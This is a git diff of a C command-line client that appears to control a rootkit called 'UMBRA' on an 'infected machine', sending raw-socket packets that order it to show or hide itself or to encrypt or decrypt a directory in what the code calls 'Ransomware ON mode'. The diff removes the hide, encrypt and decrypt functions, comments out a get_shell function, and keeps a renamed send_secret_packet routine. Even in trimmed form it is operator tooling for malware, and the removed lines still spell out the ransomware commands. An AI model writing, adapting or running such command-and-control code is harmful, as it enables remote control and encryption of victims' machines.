@@ -9,6 +9,8 @@
 #include <netdb.h>
 #include <stdlib.h>
 
+#include "../constants/constants.h"
+
 // For printing with colors
 #define KGRN  "\x1B[32m"
 #define KYLW  "\x1B[33m"
@@ -75,7 +77,7 @@ char* getLocalIpAddress(){
 }
 
 
-void get_shell(char* argv){
+/*void get_shell(char* argv){
     char* local_ip = getLocalIpAddress();
     printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
     check_ip_address_format(argv);
@@ -114,13 +116,13 @@ void get_shell(char* argv){
     }
     
     free(local_ip);
-}
+}*/
 
-void show_rootkit(char* argv){
+void send_secret_packet(char* argv){
     char* local_ip = getLocalIpAddress();
     printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
     check_ip_address_format(argv);
-    packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, "UMBRA_SHOW_ROOTKIT");
+    packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, SECRET_PACKET_PAYLOAD);
     printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
     //Sending the malicious payload
     if(rawsocket_send(packet)<0){
@@ -130,61 +132,6 @@ void show_rootkit(char* argv){
     }
     free(local_ip);
 }
-
-void hide_rootkit(char* argv){
-    char* local_ip = getLocalIpAddress();
-    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
-    check_ip_address_format(argv);
-    packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, "UMBRA_HIDE_ROOTKIT");
-    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
-    //Sending the malicious payload
-    if(rawsocket_send(packet)<0){
-        printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
-    }else{
-        printf("["KGRN"OK"RESET"]""Request to hide successfully sent!\n");
-    }
-    free(local_ip);
-}
-
-void encrypt_directory(char* argv, char* dir){
-    char* local_ip = getLocalIpAddress();
-    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
-    printf("["KBLU"INFO"RESET"]""Target PATH selected: %s\n", dir);
-    char data_buffer[1024];
-    strcpy(data_buffer, "UMBRA_ENCRYPT_DIR");
-    strcat(data_buffer, dir);
-    check_ip_address_format(argv);
-    packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, data_buffer);
-    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
-    //Sending the malicious payload
-    if(rawsocket_send(packet)<0){
-        printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
-    }else{
-        printf("["KGRN"OK"RESET"]""Request to encrypt directory successfully sent!\n");
-    }
-    free(local_ip);
-}
-
-void decrypt_directory(char* argv, char* dir){
-    char* local_ip = getLocalIpAddress();
-    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
-    printf("["KBLU"INFO"RESET"]""Target PATH selected: %s\n", dir);
-    char data_buffer[1024];
-    strcpy(data_buffer, "UMBRA_DECRYPT_DIR");
-    strcat(data_buffer, dir);
-    check_ip_address_format(argv);
-    packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, data_buffer);
-    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
-    //Sending the malicious payload
-    if(rawsocket_send(packet)<0){
-        printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
-    }else{
-        printf("["KGRN"OK"RESET"]""Request to decrypt directory successfully sent!\n");
-    }
-    free(local_ip);
-}
-
-
 
 
 void main(int argc, char* argv[]){
@@ -214,7 +161,7 @@ void main(int argc, char* argv[]){
             printf("["KBLU"INFO"RESET"]""Activated SEND a SECRET mode\n");
             //printf("Option S has argument %s\n", optarg);
             strcpy(dest_address, optarg);
-            get_shell(dest_address);
+            send_secret_packet(dest_address);
             PARAM_MODULE_ACTIVATED = 1;
             
             break;
@@ -272,20 +219,7 @@ void main(int argc, char* argv[]){
         }
     }
 
-    //Checking activated mode, for those requiring multiple args
-    if(ENCRYPT_MODE_SEL == 1 && PATH_ARG_PROVIDED == 1){
-        print_welcome_message();
-        sleep(1);
-        //Selecting encrypt directory - Ransomware ON mode
-        printf("["KBLU"INFO"RESET"]""Selected ENCRYPT a rootkit remotely\n");
-        encrypt_directory(dest_address, path_arg);
-    }else if(DECRYPT_MODE_SEL == 1 && PATH_ARG_PROVIDED == 1){
-        print_welcome_message();
-        sleep(1);
-        //Selecting encrypt directory - Ransomware ON mode
-        printf("["KBLU"INFO"RESET"]""Selected DECRYPT a rootkit remotely\n");
-        decrypt_directory(dest_address, path_arg);
-    }else if(PARAM_MODULE_ACTIVATED==0){
+    if(PARAM_MODULE_ACTIVATED==0){
         printf("["KRED"ERROR"RESET"]""Invalid parameters\n");
         print_help_dialog(argv[0]);
         exit(EXIT_FAILURE);
